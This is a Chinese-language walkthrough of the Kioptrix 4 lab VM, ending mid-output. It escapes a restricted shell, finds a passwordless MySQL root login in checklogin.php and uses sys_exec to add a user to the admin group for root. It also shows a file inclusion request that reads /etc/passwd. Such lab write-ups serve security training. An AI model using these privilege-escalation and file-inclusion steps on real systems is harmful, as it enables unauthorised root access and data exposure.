<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ssh john@192.168.84.139</span></span><br><span class="line">The authenticity of host <span class="string">&#x27;192.168.84.139 (192.168.84.139)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">RSA key fingerprint is SHA256:3fqlLtTAindnY7CGwxoXJ9M2rQF6nn35SFMTVv56lww.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>192.168.84.139<span class="string">&#x27; (RSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">john@192.168.84.139&#x27;</span>s password: </span><br><span class="line">Welcome to LigGoat Security Systems - We are Watching</span><br><span class="line">== Welcome LigGoat Employee ==</span><br><span class="line">LigGoat Shell is <span class="keyword">in</span> place so you  don<span class="string">&#x27;t screw up</span></span><br><span class="line"><span class="string">Type &#x27;</span>?<span class="string">&#x27; or &#x27;</span><span class="built_in">help</span><span class="string">&#x27; to get the list of allowed commands</span></span><br><span class="line"><span class="string">john:~$ ls</span></span><br><span class="line"><span class="string">john:~$ pwd</span></span><br><span class="line"><span class="string">*** unknown command: pwd</span></span><br><span class="line"><span class="string">john:~$ whoami</span></span><br><span class="line"><span class="string">*** unknown command: whoami</span></span><br><span class="line"><span class="string">john:~$echo &#x27;</span>casdcasdc<span class="string">&#x27;                                                                             </span></span><br><span class="line"><span class="string">casdcasdc</span></span><br></pre></td></tr></table></figure>

<p>通过使用命令echo os.system(‘&#x2F;bin&#x2F;bash’)轻松地“转义”并绕过有限制的shell。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">john:~$ <span class="built_in">echo</span> os.system(<span class="string">&#x27;/bin/bash&#x27;</span>)</span><br><span class="line">john@Kioptrix4:~$ <span class="built_in">ls</span></span><br><span class="line">john@Kioptrix4:~$ <span class="built_in">pwd</span></span><br><span class="line">/home/john</span><br><span class="line">john@Kioptrix4:~$ <span class="built_in">whoami</span></span><br><span class="line">john</span><br><span class="line">john@Kioptrix4:~$ </span><br></pre></td></tr></table></figure>

<p>使用命令行收集信息</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line">john@Kioptrix4:~$ <span class="built_in">cat</span> /etc/*-release </span><br><span class="line">DISTRIB_ID=Ubuntu</span><br><span class="line">DISTRIB_RELEASE=8.04</span><br><span class="line">DISTRIB_CODENAME=hardy</span><br><span class="line">DISTRIB_DESCRIPTION=<span class="string">&quot;Ubuntu 8.04.3 LTS&quot;</span></span><br><span class="line">john@Kioptrix4:~$ <span class="built_in">cat</span> /proc/version</span><br><span class="line">Linux version 2.6.24-24-server (buildd@palmer) (gcc version 4.2.4 (Ubuntu 4.2.4-1ubuntu4)) <span class="comment">#1 SMP Tue Jul 7 20:21:17 UTC 2009</span></span><br><span class="line">john@Kioptrix4:~$ ps -ef | grep root</span><br><span class="line">root         1     0  0 04:44 ?        00:00:01 /sbin/init</span><br><span class="line">root         2     0  0 04:44 ?        00:00:00 [kthreadd]</span><br><span class="line">root         3     2  0 04:44 ?        00:00:00 [migration/0]</span><br><span class="line">root         4     2  0 04:44 ?        00:00:00 [ksoftirqd/0]</span><br><span class="line">root         5     2  0 04:44 ?        00:00:00 [watchdog/0]</span><br><span class="line">root         6     2  0 04:44 ?        00:00:00 [migration/1]</span><br><span class="line">root         7     2  0 04:44 ?        00:00:00 [ksoftirqd/1]</span><br><span class="line">root         8     2  0 04:44 ?        00:00:00 [watchdog/1]</span><br><span class="line">root         9     2  0 04:44 ?        00:00:00 [migration/2]</span><br><span class="line">root        10     2  0 04:44 ?        00:00:00 [ksoftirqd/2]</span><br><span class="line">root        11     2  0 04:44 ?        00:00:00 [watchdog/2]</span><br><span class="line">root        12     2  0 04:44 ?        00:00:00 [migration/3]</span><br><span class="line">root        13     2  0 04:44 ?        00:00:00 [ksoftirqd/3]</span><br><span class="line">root        14     2  0 04:44 ?        00:00:00 [watchdog/3]</span><br><span class="line">root        15     2  0 04:44 ?        00:00:00 [events/0]</span><br><span class="line">root        16     2  0 04:44 ?        00:00:00 [events/1]</span><br><span class="line">root        17     2  0 04:44 ?        00:00:00 [events/2]</span><br><span class="line">root        18     2  0 04:44 ?        00:00:00 [events/3]</span><br><span class="line">root        19     2  0 04:44 ?        00:00:00 [khelper]</span><br><span class="line">root        56     2  0 04:44 ?        00:00:00 [kblockd/0]</span><br><span class="line">root        57     2  0 04:44 ?        00:00:00 [kblockd/1]</span><br><span class="line">root        58     2  0 04:44 ?        00:00:00 [kblockd/2]</span><br><span class="line">root        59     2  0 04:44 ?        00:00:00 [kblockd/3]</span><br><span class="line">root        62     2  0 04:44 ?        00:00:00 [kacpid]</span><br><span class="line">root        63     2  0 04:44 ?        00:00:00 [kacpi_notify]</span><br><span class="line">root       193     2  0 04:44 ?        00:00:00 [kseriod]</span><br><span class="line">root       247     2  0 04:44 ?        00:00:00 [pdflush]</span><br><span class="line">root       248     2  0 04:44 ?        00:00:00 [pdflush]</span><br><span class="line">root       249     2  0 04:44 ?        00:00:00 [kswapd0]</span><br><span class="line">root       291     2  0 04:44 ?        00:00:00 [aio/0]</span><br><span class="line">root       292     2  0 04:44 ?        00:00:00 [aio/1]</span><br><span class="line">root       293     2  0 04:44 ?        00:00:00 [aio/2]</span><br><span class="line">root       294     2  0 04:44 ?        00:00:00 [aio/3]</span><br><span class="line">root      1627     2  0 04:44 ?        00:00:00 [ata/0]</span><br><span class="line">root      1629     2  0 04:44 ?        00:00:00 [ata/1]</span><br><span class="line">root      1630     2  0 04:44 ?        00:00:00 [ata/2]</span><br><span class="line">root      1631     2  0 04:44 ?        00:00:00 [ata/3]</span><br><span class="line">root      1632     2  0 04:44 ?        00:00:00 [ata_aux]</span><br><span class="line">root      1800     2  0 04:44 ?        00:00:00 [ksuspend_usbd]</span><br><span class="line">root      1806     2  0 04:44 ?        00:00:00 [khubd]</span><br><span class="line">root      2474     2  0 04:44 ?        00:00:00 [scsi_eh_0]</span><br><span class="line">root      2486     2  0 04:44 ?        00:00:00 [scsi_eh_1]</span><br><span class="line">root      2489     2  0 04:44 ?        00:00:00 [scsi_eh_2]</span><br><span class="line">root      2579     2  0 04:44 ?        00:00:00 [scsi_eh_3]</span><br><span class="line">root      2580     2  0 04:44 ?        00:00:00 [scsi_eh_4]</span><br><span class="line">root      2581     2  0 04:44 ?        00:00:00 [scsi_eh_5]</span><br><span class="line">root      2582     2  0 04:44 ?        00:00:00 [scsi_eh_6]</span><br><span class="line">root      2583     2  0 04:44 ?        00:00:00 [scsi_eh_7]</span><br><span class="line">root      2584     2  0 04:44 ?        00:00:00 [scsi_eh_8]</span><br><span class="line">root      2585     2  0 04:44 ?        00:00:00 [scsi_eh_9]</span><br><span class="line">root      2586     2  0 04:44 ?        00:00:00 [scsi_eh_10]</span><br><span class="line">root      2587     2  0 04:44 ?        00:00:00 [scsi_eh_11]</span><br><span class="line">root      2588     2  0 04:44 ?        00:00:00 [scsi_eh_12]</span><br><span class="line">root      2589     2  0 04:44 ?        00:00:00 [scsi_eh_13]</span><br><span class="line">root      2590     2  0 04:44 ?        00:00:00 [scsi_eh_14]</span><br><span class="line">root      2591     2  0 04:44 ?        00:00:00 [scsi_eh_15]</span><br><span class="line">root      2592     2  0 04:44 ?        00:00:00 [scsi_eh_16]</span><br><span class="line">root      2593     2  0 04:44 ?        00:00:00 [scsi_eh_17]</span><br><span class="line">root      2594     2  0 04:44 ?        00:00:00 [scsi_eh_18]</span><br><span class="line">root      2595     2  0 04:44 ?        00:00:00 [scsi_eh_19]</span><br><span class="line">root      2596     2  0 04:44 ?        00:00:00 [scsi_eh_20]</span><br><span class="line">root      2597     2  0 04:44 ?        00:00:00 [scsi_eh_21]</span><br><span class="line">root      2598     2  0 04:44 ?        00:00:00 [scsi_eh_22]</span><br><span class="line">root      2599     2  0 04:44 ?        00:00:00 [scsi_eh_23]</span><br><span class="line">root      2600     2  0 04:44 ?        00:00:00 [scsi_eh_24]</span><br><span class="line">root      2601     2  0 04:44 ?        00:00:00 [scsi_eh_25]</span><br><span class="line">root      2602     2  0 04:44 ?        00:00:00 [scsi_eh_26]</span><br><span class="line">root      2603     2  0 04:44 ?        00:00:00 [scsi_eh_27]</span><br><span class="line">root      2604     2  0 04:44 ?        00:00:00 [scsi_eh_28]</span><br><span class="line">root      2605     2  0 04:44 ?        00:00:00 [scsi_eh_29]</span><br><span class="line">root      2606     2  0 04:44 ?        00:00:00 [scsi_eh_30]</span><br><span class="line">root      2607     2  0 04:44 ?        00:00:00 [scsi_eh_31]</span><br><span class="line">root      2608     2  0 04:44 ?        00:00:00 [scsi_eh_32]</span><br><span class="line">root      2849     2  0 04:44 ?        00:00:00 [kjournald]</span><br><span class="line">root      3028     1  0 04:45 ?        00:00:00 /sbin/udevd --daemon</span><br><span class="line">root      3701     2  0 04:45 ?        00:00:00 [kpsmoused]</span><br><span class="line">root      3800     2  0 04:45 ?        00:00:00 [btaddconn]</span><br><span class="line">root      3801     2  0 04:45 ?        00:00:00 [btdelconn]</span><br><span class="line">root      4838     1  0 04:45 tty4     00:00:00 /sbin/getty 38400 tty4</span><br><span class="line">root      4839     1  0 04:45 tty5     00:00:00 /sbin/getty 38400 tty5</span><br><span class="line">root      4841     1  0 04:45 tty2     00:00:00 /sbin/getty 38400 tty2</span><br><span class="line">root      4842     1  0 04:45 tty3     00:00:00 /sbin/getty 38400 tty3</span><br><span class="line">root      4845     1  0 04:45 tty6     00:00:00 /sbin/getty 38400 tty6</span><br><span class="line">root      4906     1  0 04:45 ?        00:00:00 /bin/dd bs 1 <span class="keyword">if</span> /proc/kmsg of /var/run/klogd/kmsg</span><br><span class="line">root      4927     1  0 04:45 ?        00:00:00 /usr/sbin/sshd</span><br><span class="line">root      4983     1  0 04:45 ?        00:00:00 /bin/sh /usr/bin/mysqld_safe</span><br><span class="line">root      5025  4983  0 04:45 ?        00:00:04 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/my</span><br><span class="line">root      5026  4983  0 04:45 ?        00:00:00 logger -p daemon.err -t mysqld_safe -i -t mysqld</span><br><span class="line">root      5120     1  0 04:45 ?        00:00:00 /usr/sbin/nmbd -D</span><br><span class="line">root      5122     1  0 04:45 ?        00:00:00 /usr/sbin/smbd -D</span><br><span class="line">root      5136  5122  0 04:45 ?        00:00:00 /usr/sbin/smbd -D</span><br><span class="line">root      5137     1  0 04:45 ?        00:00:00 /usr/sbin/winbindd</span><br><span class="line">root      5149  5137  0 04:45 ?        00:00:00 /usr/sbin/winbindd</span><br><span class="line">root      5169     1  0 04:45 ?        00:00:00 /usr/sbin/cron</span><br><span class="line">root      5191     1  0 04:45 ?        00:00:00 /usr/sbin/apache2 -k start</span><br><span class="line">root      5247     1  0 04:45 tty1     00:00:00 /sbin/getty 38400 tty1</span><br><span class="line">root      5277  5137  0 04:57 ?        00:00:00 /usr/sbin/winbindd</span><br><span class="line">root      5280  5137  0 04:57 ?        00:00:00 /usr/sbin/winbindd</span><br><span class="line">root      5880  4927  0 09:23 ?        00:00:00 sshd: john [priv]</span><br><span class="line">john      5928  5897  0 09:35 pts/0    00:00:00 grep root</span><br></pre></td></tr></table></figure>

<p>可以看到MySQL以root权限运行。 由于具有对计算机的ssh访问权限，因此可以通过访问配置文件来查看是否能找到数据库凭据。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">john@Kioptrix4:/var/www$ <span class="built_in">ls</span></span><br><span class="line">checklogin.php  index.php          logout.php  tmpbbmjx.php  tmpbtzfy.php  tmpuijdt.php</span><br><span class="line">database.sql    john               member.php  tmpbdorc.php  tmpubjrn.php  tmpureio.php</span><br><span class="line">images          login_success.php  robert      tmpbstyp.php  tmpuepxr.php  tmpuyhae.php</span><br><span class="line"></span><br><span class="line">john@Kioptrix4:/var/www$ <span class="built_in">cat</span> checklogin.php</span><br><span class="line">&lt;?php</span><br><span class="line">ob_start();</span><br><span class="line"><span class="variable">$host</span>=<span class="string">&quot;localhost&quot;</span>; // Host name</span><br><span class="line"><span class="variable">$username</span>=<span class="string">&quot;root&quot;</span>; // Mysql username</span><br><span class="line"><span class="variable">$password</span>=<span class="string">&quot;&quot;</span>; // Mysql password</span><br><span class="line"><span class="variable">$db_name</span>=<span class="string">&quot;members&quot;</span>; // Database name</span><br><span class="line"><span class="variable">$tbl_name</span>=<span class="string">&quot;members&quot;</span>; // Table name</span><br><span class="line"></span><br><span class="line">// Connect to server and select databse.</span><br><span class="line">mysql_connect(<span class="string">&quot;<span class="variable">$host</span>&quot;</span>, <span class="string">&quot;<span class="variable">$username</span>&quot;</span>, <span class="string">&quot;<span class="variable">$password</span>&quot;</span>)or die(<span class="string">&quot;cannot connect&quot;</span>);</span><br><span class="line">mysql_select_db(<span class="string">&quot;<span class="variable">$db_name</span>&quot;</span>)or die(<span class="string">&quot;cannot select DB&quot;</span>);</span><br><span class="line"></span><br><span class="line">// Define <span class="variable">$myusername</span> and <span class="variable">$mypassword</span></span><br><span class="line"><span class="variable">$myusername</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;myusername&#x27;</span>];</span><br><span class="line"><span class="variable">$mypassword</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;mypassword&#x27;</span>];</span><br><span class="line"></span><br><span class="line">// To protect MySQL injection (more detail about MySQL injection)</span><br><span class="line"><span class="variable">$myusername</span> = stripslashes(<span class="variable">$myusername</span>);</span><br><span class="line">//<span class="variable">$mypassword</span> = stripslashes(<span class="variable">$mypassword</span>);</span><br><span class="line"><span class="variable">$myusername</span> = mysql_real_escape_string(<span class="variable">$myusername</span>);</span><br><span class="line">//<span class="variable">$mypassword</span> = mysql_real_escape_string(<span class="variable">$mypassword</span>);</span><br><span class="line"></span><br><span class="line">//<span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM <span class="variable">$tbl_name</span> WHERE username=&#x27;<span class="variable">$myusername</span>&#x27; and password=&#x27;<span class="variable">$mypassword</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=mysql_query(<span class="string">&quot;SELECT * FROM <span class="variable">$tbl_name</span> WHERE username=&#x27;<span class="variable">$myusername</span>&#x27; and password=&#x27;<span class="variable">$mypassword</span>&#x27;&quot;</span>);</span><br><span class="line">//<span class="variable">$result</span>=mysql_query(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line">// Mysql_num_row is counting table row</span><br><span class="line"><span class="variable">$count</span>=mysql_num_rows(<span class="variable">$result</span>);</span><br><span class="line">// If result matched <span class="variable">$myusername</span> and <span class="variable">$mypassword</span>, table row must be 1 row</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$count</span>!=0)&#123;</span><br><span class="line">// Register <span class="variable">$myusername</span>, <span class="variable">$mypassword</span> and redirect to file <span class="string">&quot;login_success.php&quot;</span></span><br><span class="line">        session_register(<span class="string">&quot;myusername&quot;</span>);</span><br><span class="line">        session_register(<span class="string">&quot;mypassword&quot;</span>);</span><br><span class="line">        header(<span class="string">&quot;location:login_success.php?username=<span class="variable">$myusername</span>&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Wrong Username or Password&quot;</span>;</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&lt;form method=&quot;link&quot; action=&quot;index.php&quot;&gt;&lt;input type=submit value=&quot;Try Again&quot;&gt;&lt;/form&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ob_end_flush();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>不需要密码即可访问数据库。 由于我们MySQL的root访问权限，因此可以使用用户定义的函数执行命令（在操作系统本身上）。 因为可以以root用户身份访问MySQL服务器，所以我们将使用用户定义函数将特权升级为root用户。 为了执行这些命令，我们需要确保lib_mysqludf_sys.so在服务器上。 使用whereis命令，我发现它已经安装在服务器上。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">john@Kioptrix4:/var/www$ whereis lib_mysqludf_sys.so</span><br><span class="line">lib_mysqludf_sys: /usr/lib/lib_mysqludf_sys.so</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ssh john@192.168.84.139</span></span><br><span class="line">john@192.168.84.139<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Welcome to LigGoat Security Systems - We are Watching</span></span><br><span class="line"><span class="string">== Welcome LigGoat Employee ==</span></span><br><span class="line"><span class="string">LigGoat Shell is in place so you  don&#x27;</span>t screw up</span><br><span class="line">Type <span class="string">&#x27;?&#x27;</span> or <span class="string">&#x27;help&#x27;</span> to get the list of allowed commands</span><br><span class="line">john:~$ <span class="built_in">echo</span> os.system(<span class="string">&#x27;/bin/bash&#x27;</span>)</span><br><span class="line">john@Kioptrix4:~$ <span class="built_in">ls</span></span><br><span class="line">john@Kioptrix4:~$ mysql -h localhost -u root -p</span><br><span class="line">Enter password: </span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection <span class="built_in">id</span> is 6760</span><br><span class="line">Server version: 5.0.51a-3ubuntu5.4 (Ubuntu)</span><br><span class="line"></span><br><span class="line">Type <span class="string">&#x27;help;&#x27;</span> or <span class="string">&#x27;\h&#x27;</span> <span class="keyword">for</span> <span class="built_in">help</span>. Type <span class="string">&#x27;\c&#x27;</span> to clear the buffer.</span><br><span class="line"></span><br><span class="line">mysql&gt; select sys_exec(<span class="string">&#x27;usermod -a -G admin john&#x27;</span>);</span><br><span class="line">+--------------------------------------+</span><br><span class="line">| sys_exec(<span class="string">&#x27;usermod -a -G admin john&#x27;</span>) |</span><br><span class="line">+--------------------------------------+</span><br><span class="line">| NULL                                 | </span><br><span class="line">+--------------------------------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="built_in">exit</span>;                                       </span><br><span class="line">Bye</span><br><span class="line">john@Kioptrix4:~$ sudo su</span><br><span class="line">root@Kioptrix4:/home/john<span class="comment"># MyNameIsJohn</span></span><br><span class="line">bash: MyNameIsJohn: <span class="built_in">command</span> not found</span><br><span class="line">root@Kioptrix4:/home/john<span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line">root@Kioptrix4:/home/john<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line">root@Kioptrix4:/home/john<span class="comment">#</span></span><br><span class="line">root@Kioptrix4:~<span class="comment"># cat congrats.txt</span></span><br><span class="line">Congratulations!</span><br><span class="line">You<span class="string">&#x27;ve got root.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">There is more then one way to get root on this system. Try and find them.</span></span><br><span class="line"><span class="string">I&#x27;</span>ve only tested two (2) methods, but it doesn<span class="string">&#x27;t mean there aren&#x27;</span>t more.</span><br><span class="line">As always there<span class="string">&#x27;s an easy way, and a not so easy way to pop this box.</span></span><br><span class="line"><span class="string">Look for other methods to get root privileges other than running an exploit.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">It took a while to make this. For one it&#x27;</span>s not as easy as it may look, and</span><br><span class="line">also work and family life are my priorities. Hobbies are low on my list.</span><br><span class="line">Really hope you enjoyed this one.</span><br><span class="line"></span><br><span class="line">If you haven<span class="string">&#x27;t already, check out the other VMs available on:</span></span><br><span class="line"><span class="string">www.kioptrix.com</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Thanks for playing,</span></span><br><span class="line"><span class="string">loneferret</span></span><br></pre></td></tr></table></figure>

<p>使用sys_exec，可以运行将john添加到admin组的usermod，然后运行sudo su以获得root权限的shell,至此渗透靶机的目标已经完成。</p>
<h3 id="其它方法"><a href="#其它方法" class="headerlink" title="其它方法"></a>其它方法</h3><p>由于受sock_sendpage（）NULL指针取消引用攻击，还能使用内核提权脚本进行提权，具体方法自行google，常规操作就不在此赘述.</p>
<ul>
<li>文件包含</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">(请求包)</span><br><span class="line"></span><br><span class="line">GET /member.php?username=/etc/etc/passwd%00 HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: 192.168.84.139</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span><br><span class="line"></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"></span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line"></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line"></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">Cookie: PHPSESSID=b5a332dd49e1d5192ffb8915fa3e7f84</span><br><span class="line"></span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">(响应包)</span><br><span class="line"></span><br><span class="line">HTTP/1.1 302 Found</span><br><span class="line"></span><br><span class="line">Date: Tue, 10 Dec 2019 16:39:07 GMT</span><br><span class="line"></span><br><span class="line">Server: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch</span><br><span class="line"></span><br><span class="line">X-Powered-By: PHP/5.2.4-2ubuntu5.6</span><br><span class="line"></span><br><span class="line">Expires: Thu, 19 Nov 1981 08:52:00 GMT</span><br><span class="line"></span><br><span class="line">Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0</span><br><span class="line"></span><br><span class="line">Pragma: no-cache</span><br><span class="line"></span><br><span class="line">location: index.php</span><br><span class="line"></span><br><span class="line">Content-Length: 1146</span><br><span class="line"></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">Content-Type: text/html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/bin/sh</span><br><span class="line">bin:x:2:2:bin:/bin:/bin/sh</span><br><span class="line">sys:x:3:3:sys:/dev:/bin/sh</span><br><span class="line"><span class="built_in">sync</span>:x:4:65534:<span class="built_in">sync</span>:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/bin/sh</span><br><span class="line">man:x:6:12:man:/var/cache/man:/bin/sh</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/bin/sh</span><br><span class="line">mail:x:8:8:mail:/var/mail:/bin/sh</span><br><span class="line">news:x:9:9:news:/var/spool/news:/bin/sh</span><br><span 